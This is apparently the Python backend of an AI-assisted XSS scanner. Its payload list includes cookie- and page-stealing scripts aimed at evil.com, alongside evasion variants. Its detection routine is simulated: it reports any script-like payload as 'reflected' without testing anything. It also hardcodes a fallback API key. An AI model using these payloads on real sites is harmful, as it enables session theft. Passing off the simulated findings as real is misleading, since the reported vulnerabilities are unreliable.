from fastapi import FastAPI, APIRouter, BackgroundTasks, HTTPException, Query
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import asyncio
import json
from emergentintegrations.llm.chat import LlmChat, UserMessage
import re
from urllib.parse import urlparse
import aiohttp
from bs4 import BeautifulSoup

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# LLM Configuration
EMERGENT_LLM_KEY = os.environ.get('EMERGENT_LLM_KEY', 'sk-emergent-556F249747fEbDfFd2')

# Create the main app without a prefix
app = FastAPI(title="AI-Enhanced XSS Scanner Platform", version="1.0.0")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Pydantic Models
class ScanRequest(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    target_url: str
    scan_type: str = "comprehensive"  # quick, comprehensive, custom
    custom_payloads: Optional[List[str]] = None
    include_forms: bool = True
    include_urls: bool = True
    max_depth: int = 3
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class Vulnerability(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    scan_id: str
    vulnerability_type: str
    severity: str  # critical, high, medium, low
    endpoint: str
    parameter: str
    payload: str
    evidence: str
    ai_summary: Optional[str] = None
    remediation_suggestion: Optional[str] = None
    false_positive: bool = False
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class ScanResult(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    scan_id: str
    status: str  # pending, running, completed, failed
    total_vulnerabilities: int = 0
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    ai_risk_score: Optional[float] = None
    ai_executive_summary: Optional[str] = None
    scan_duration: Optional[float] = None
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None

class AITriageRequest(BaseModel):
    vulnerability_ids: List[str]
    context: Optional[str] = None

class NLPQueryRequest(BaseModel):
    query: str
    session_id: str = Field(default_factory=lambda: str(uuid.uuid4()))

# XSS Payloads and Detection Patterns
XSS_PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ],
    "advanced": [
        "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
        "<img src=x onerror=fetch('http://evil.com/steal?data='+document.body.innerHTML)>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "<svg/onload=location='javascript:alert`XSS`'>",
        "<details open ontoggle=alert('XSS')>"
    ],
    "evasion": [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>ale%72t('XSS')</script>",
        "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;</script>",
        "<script src=data:,alert('XSS')></script>",
        "<svg><script>alert('XSS')</script></svg>"
    ]
}

# AI Chat Instances
async def get_gpt4_chat(session_id: str, system_message: str = "You are an expert cybersecurity analyst specializing in XSS vulnerability analysis."):
    chat = LlmChat(
        api_key=EMERGENT_LLM_KEY,
        session_id=session_id,
        system_message=system_message
    ).with_model("openai", "gpt-4o")
    return chat

async def get_claude_chat(session_id: str, system_message: str = "You are a security report specialist focused on creating clear, actionable security findings."):
    chat = LlmChat(
        api_key=EMERGENT_LLM_KEY,
        session_id=session_id,
        system_message=system_message
    ).with_model("anthropic", "claude-3-7-sonnet-20250219")
    return chat

# Scanning Engine Functions
async def perform_xss_scan(scan_request: ScanRequest) -> List[Vulnerability]:
    """Perform XSS scanning on the target URL"""
    vulnerabilities = []
    
    try:
        # Parse URL
        parsed_url = urlparse(scan_request.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Get page content
        async with aiohttp.ClientSession() as session:
            async with session.get(scan_request.target_url) as response:
                content = await response.text()
                
        # Parse HTML to find forms and parameters
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form') if scan_request.include_forms else []
        
        # Select payloads based on scan type
        payloads = []
        if scan_request.scan_type == "quick":
            payloads = XSS_PAYLOADS["basic"][:3]
        elif scan_request.scan_type == "comprehensive":
            payloads = XSS_PAYLOADS["basic"] + XSS_PAYLOADS["advanced"] + XSS_PAYLOADS["evasion"]
        elif scan_request.scan_type == "custom" and scan_request.custom_payloads:
            payloads = scan_request.custom_payloads
        
        # Test forms for XSS
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                form_action = base_url + form_action
                
            inputs = form.find_all(['input', 'textarea', 'select'])
            
            for input_field in inputs:
                input_name = input_field.get('name', 'unknown')
                input_type = input_field.get('type', 'text')
                
                if input_type in ['text', 'search', 'url', 'email', 'password']:
                    for payload in payloads:
                        # Test payload
                        vulnerability = await test_payload(
                            scan_request.id,
                            form_action,
                            input_name,
                            payload,
                            "form_input"
                        )
                        if vulnerability:
                            vulnerabilities.append(vulnerability)
        
        # Test URL parameters
        if scan_request.include_urls and '?' in scan_request.target_url:
            url_params = scan_request.target_url.split('?')[1].split('&')
            for param in url_params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    for payload in payloads[:5]:  # Limit URL testing
                        vulnerability = await test_payload(
                            scan_request.id,
                            scan_request.target_url,
                            param_name,
                            payload,
                            "url_parameter"
                        )
                        if vulnerability:
                            vulnerabilities.append(vulnerability)
    
    except Exception as e:
        logger.error(f"Error during XSS scan: {str(e)}")
    
    return vulnerabilities

async def test_payload(scan_id: str, endpoint: str, parameter: str, payload: str, vuln_type: str) -> Optional[Vulnerability]:
    """Test a specific payload and determine if vulnerability exists"""
    try:
        # Simulate payload testing (in real implementation, this would use headless browser)
        # For demo purposes, we'll simulate some vulnerabilities
        
        # Simple heuristic: if payload contains script tags or event handlers
        is_vulnerable = any(pattern in payload.lower() for pattern in ['<script', 'onerror=', 'onload=', 'javascript:'])
        
        if is_vulnerable:
            # Determine severity based on payload complexity
            severity = "high"
            if "document.cookie" in payload or "fetch(" in payload:
                severity = "critical"
            elif "alert(" in payload:
                severity = "medium"
            
            vulnerability = Vulnerability(
                scan_id=scan_id,
                vulnerability_type=f"XSS_{vuln_type}",
                severity=severity,
                endpoint=endpoint,
                parameter=parameter,
                payload=payload,
                evidence=f"Payload '{payload}' was reflected in parameter '{parameter}' at endpoint '{endpoint}'"
            )
            
            return vulnerability
    
    except Exception as e:
        logger.error(f"Error testing payload: {str(e)}")
    
    return None

async def analyze_vulnerability_with_ai(vulnerability: Vulnerability) -> Vulnerability:
    """Analyze vulnerability using AI for summary and remediation"""
    try:
        # GPT-4 for technical analysis
        gpt4_chat = await get_gpt4_chat(f"vuln_analysis_{vulnerability.id}")
        
        analysis_prompt = f"""
        Analyze this XSS vulnerability:
        
        Type: {vulnerability.vulnerability_type}
        Severity: {vulnerability.severity}
        Endpoint: {vulnerability.endpoint}
        Parameter: {vulnerability.parameter}
        Payload: {vulnerability.payload}
        Evidence: {vulnerability.evidence}
        
        Provide a technical summary (2-3 sentences) explaining the vulnerability and its potential impact.
        """
        
        analysis_response = await gpt4_chat.send_message(UserMessage(text=analysis_prompt))
        vulnerability.ai_summary = analysis_response
        
        # Claude for remediation suggestions
        claude_chat = await get_claude_chat(f"remediation_{vulnerability.id}")
        
        remediation_prompt = f"""
        Provide specific remediation guidance for this XSS vulnerability:
        
        Type: {vulnerability.vulnerability_type}
        Parameter: {vulnerability.parameter}
        Payload: {vulnerability.payload}
        
        Provide concrete code examples and security best practices to fix this issue.
        Focus on input validation, output encoding, and CSP implementation.
        """
        
        remediation_response = await claude_chat.send_message(UserMessage(text=remediation_prompt))
        vulnerability.remediation_suggestion = remediation_response
        
    except Exception as e:
        logger.error(f"Error in AI analysis: {str(e)}")
        vulnerability.ai_summary = "AI analysis failed - manual review required"
        vulnerability.remediation_suggestion = "Apply standard XSS prevention techniques: input validation, output encoding, CSP headers"
    
    return vulnerability

# Background task for scanning
async def background_scan(scan_request: ScanRequest):
    """Background task to perform scanning"""
    try:
        # Update scan status to running
        await db.scan_results.update_one(
            {"scan_id": scan_request.id},
            {"$set": {"status": "running", "started_at": datetime.now(timezone.utc)}}
        )
        
        start_time = datetime.now(timezone.utc)
        
        # Perform scan
        vulnerabilities = await perform_xss_scan(scan_request)
        
        # Analyze each vulnerability with AI
        analyzed_vulnerabilities = []
        for vuln in vulnerabilities:
            analyzed_vuln = await analyze_vulnerability_with_ai(vuln)
            analyzed_vulnerabilities.append(analyzed_vuln)
            
            # Store vulnerability in database
            await db.vulnerabilities.insert_one(analyzed_vuln.dict())
        
        # Calculate scan results
        end_time = datetime.now(timezone.utc)
        duration = (end_time - start_time).total_seconds()
        
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for vuln in analyzed_vulnerabilities:
            severity_counts[vuln.severity] += 1
        
        # Generate executive summary with AI
        if analyzed_vulnerabilities:
            claude_chat = await get_claude_chat(f"executive_summary_{scan_request.id}")
            
            summary_prompt = f"""
            Generate an executive summary for this XSS security scan:
            
            Target: {scan_request.target_url}
            Total Vulnerabilities: {len(analyzed_vulnerabilities)}
            Critical: {severity_counts['critical']}, High: {severity_counts['high']}, Medium: {severity_counts['medium']}, Low: {severity_counts['low']}
            
            Provide a 2-3 sentence executive summary focusing on business risk and priority actions.
            """
            
            executive_summary = await claude_chat.send_message(UserMessage(text=summary_prompt))
        else:
            executive_summary = "No XSS vulnerabilities detected in the target application."
        
        # Update scan results
        await db.scan_results.update_one(
            {"scan_id": scan_request.id},
            {"$set": {
                "status": "completed",
                "total_vulnerabilities": len(analyzed_vulnerabilities),
                "critical_count": severity_counts["critical"],
                "high_count": severity_counts["high"],
                "medium_count": severity_counts["medium"],
                "low_count": severity_counts["low"],
                "ai_risk_score": min(10.0, len(analyzed_vulnerabilities) * 2.0),
                "ai_executive_summary": executive_summary,
                "scan_duration": duration,
                "completed_at": end_time
            }}
        )
        
    except Exception as e:
        logger.error(f"Error in background scan: {str(e)}")
        await db.scan_results.update_one(
            {"scan_id": scan_request.id},
            {"$set": {"status": "failed", "completed_at": datetime.now(timezone.utc)}}
        )

# API Endpoints
@api_router.post("/scans", response_model=ScanRequest)
async def create_scan(scan_request: ScanRequest, background_tasks: BackgroundTasks):
    """Create a new XSS scan"""
    # Store scan request
    await db.scans.insert_one(scan_request.dict())
    
    # Create initial scan result
    scan_result = ScanResult(scan_id=scan_request.id, status="pending")
    await db.scan_results.insert_one(scan_result.dict())
    
    # Start background scanning
    background_tasks.add_task(background_scan, scan_request)
    
    return scan_request

@api_router.get("/scans", response_model=List[ScanRequest])
async def get_scans():
    """Get all scans"""
    scans = await db.scans.find().sort("created_at", -1).to_list(100)
    return [ScanRequest(**scan) for scan in scans]

@api_router.get("/scans/{scan_id}/result", response_model=ScanResult)
async def get_scan_result(scan_id: str):
    """Get scan result by ID"""
    result = await db.scan_results.find_one({"scan_id": scan_id})
    if not result:
        raise HTTPException(status_code=404, detail="Scan result not found")
    return ScanResult(**result)

@api_router.get("/scans/{scan_id}/vulnerabilities", response_model=List[Vulnerability])
async def get_scan_vulnerabilities(scan_id: str):
    """Get vulnerabilities for a specific scan"""
    vulnerabilities = await db.vulnerabilities.find({"scan_id": scan_id}).sort("severity", 1).to_list(1000)
    return [Vulnerability(**vuln) for vuln in vulnerabilities]

@api_router.post("/ai/triage")
async def ai_triage_vulnerabilities(request: AITriageRequest):
    """AI-powered triage of multiple vulnerabilities"""
    try:
        # Get vulnerabilities
        vulnerabilities = []
        for vuln_id in request.vulnerability_ids:
            vuln = await db.vulnerabilities.find_one({"id": vuln_id})
            if vuln:
                vulnerabilities.append(Vulnerability(**vuln))
        
        if not vulnerabilities:
            raise HTTPException(status_code=404, detail="No vulnerabilities found")
        
        # GPT-4 triage analysis
        gpt4_chat = await get_gpt4_chat(f"triage_{uuid.uuid4()}")
        
        triage_prompt = f"""
        Perform triage analysis on these {len(vulnerabilities)} XSS vulnerabilities:
        
        {chr(10).join([f"ID: {v.id}, Type: {v.vulnerability_type}, Severity: {v.severity}, Endpoint: {v.endpoint}, Parameter: {v.parameter}" for v in vulnerabilities])}
        
        Context: {request.context or 'No additional context provided'}
        
        Provide:
        1. Priority ranking (1-{len(vulnerabilities)})
        2. Recommended remediation order
        3. Business impact assessment
        4. Quick-win vs. long-term fixes
        
        Format as JSON with vulnerability IDs and priority scores.
        """
        
        triage_response = await gpt4_chat.send_message(UserMessage(text=triage_prompt))
        
        return {
            "triage_analysis": triage_response,
            "vulnerability_count": len(vulnerabilities),
            "session_id": f"triage_{uuid.uuid4()}"
        }
        
    except Exception as e:
        logger.error(f"Error in AI triage: {str(e)}")
        raise HTTPException(status_code=500, detail="AI triage analysis failed")

@api_router.post("/ai/nlp-query")
async def nlp_query(request: NLPQueryRequest):
    """Natural language querying of vulnerability data"""
    try:
        # Get recent vulnerabilities for context
        recent_vulns = await db.vulnerabilities.find().sort("created_at", -1).limit(50).to_list(50)
        recent_scans = await db.scan_results.find().sort("completed_at", -1).limit(20).to_list(20)
        
        # GPT-4 for NLP processing
        gpt4_chat = await get_gpt4_chat(request.session_id, 
            "You are an AI assistant that helps security analysts query and understand XSS vulnerability data using natural language.")
        
        context_data = {
            "recent_vulnerabilities": len(recent_vulns),
            "vulnerability_types": list(set([v.get("vulnerability_type", "") for v in recent_vulns])),
            "severity_distribution": {
                "critical": len([v for v in recent_vulns if v.get("severity") == "critical"]),
                "high": len([v for v in recent_vulns if v.get("severity") == "high"]),
                "medium": len([v for v in recent_vulns if v.get("severity") == "medium"]),
                "low": len([v for v in recent_vulns if v.get("severity") == "low"])
            },
            "recent_scans": len(recent_scans),
            "common_endpoints": list(set([v.get("endpoint", "")[:50] + "..." if len(v.get("endpoint", "")) > 50 else v.get("endpoint", "") for v in recent_vulns[:10]]))
        }
        
        nlp_prompt = f"""
        User Query: {request.query}
        
        Available Vulnerability Data Context:
        {json.dumps(context_data, indent=2)}
        
        Please provide a helpful response to the user's question about XSS vulnerabilities, scans, and security insights.
        If specific data is requested, explain what information is available and provide relevant insights.
        """
        
        nlp_response = await gpt4_chat.send_message(UserMessage(text=nlp_prompt))
        
        return {
            "query": request.query,
            "response": nlp_response,
            "session_id": request.session_id,
            "context_summary": context_data
        }
        
    except Exception as e:
        logger.error(f"Error in NLP query: {str(e)}")
        raise HTTPException(status_code=500, detail="NLP query processing failed")

@api_router.get("/dashboard/stats")
async def get_dashboard_stats():
    """Get dashboard statistics"""
    try:
        total_scans = await db.scans.count_documents({})
        completed_scans = await db.scan_results.count_documents({"status": "completed"})
        total_vulnerabilities = await db.vulnerabilities.count_documents({})
        
        # Severity distribution
        critical_count = await db.vulnerabilities.count_documents({"severity": "critical"})
        high_count = await db.vulnerabilities.count_documents({"severity": "high"})
        medium_count = await db.vulnerabilities.count_documents({"severity": "medium"})
        low_count = await db.vulnerabilities.count_documents({"severity": "low"})
        
        # Recent activity
        recent_scans = await db.scan_results.find({"status": "completed"}).sort("completed_at", -1).limit(5).to_list(5)
        
        return {
            "total_scans": total_scans,
            "completed_scans": completed_scans,
            "total_vulnerabilities": total_vulnerabilities,
            "severity_distribution": {
                "critical": critical_count,
                "high": high_count,
                "medium": medium_count,
                "low": low_count
            },
            "recent_scans": [ScanResult(**scan) for scan in recent_scans]
        }
        
    except Exception as e:
        logger.error(f"Error getting dashboard stats: {str(e)}")
        raise HTTPException(status_code=500, detail="Failed to get dashboard statistics")

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()